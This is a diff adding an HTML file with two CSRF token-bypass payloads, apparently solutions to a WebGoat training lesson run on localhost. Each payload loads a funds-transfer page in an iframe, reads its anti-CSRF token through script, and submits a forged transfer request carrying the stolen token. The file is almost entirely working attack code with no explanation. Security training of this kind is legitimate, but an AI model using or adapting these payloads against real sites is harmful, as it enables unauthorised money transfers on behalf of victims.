@@ -1,0 +1,24 @@
+<iframe id="iframe" src="http://localhost:8090/WebGoat/attack?Screen=605842438&menu=900&transfer=main" onload="part5()" width="500" height="500"></iframe>
+<iframe id="iframe2" src="" width="100" height="100"></iframe>
+<script>
+function part5() {
+  page=document.getElementById("iframe");
+  token_val = page.contentDocument.forms[0].token.value;
+  console.log("CSRF Token:", token_val);
+  document.getElementById('iframe2').src='http://localhost:8090/WebGoat/attack?Screen=605842438&menu=900&transfer=5000&token='+token_val;
+}
+</script>
+
+
+
+
+<script type="text/javascript">
+function obtain_token() {
+  var transfer_page,token_value;
+  transfer_page=document.getElementById("transfer_funds");
+  token_value=transfer_page.contentDocument.getElementsByName("token")[0].value;
+  transfer_page.src="attack?Screen=1469770765&menu=900&transfer=1145141919810&token="+token_value;
+}
+</script>
+
+<iframe src="attack?Screen=605842438&menu=900&transfer=main" onload="obtain_token()" id="transfer_funds"> </iframe>
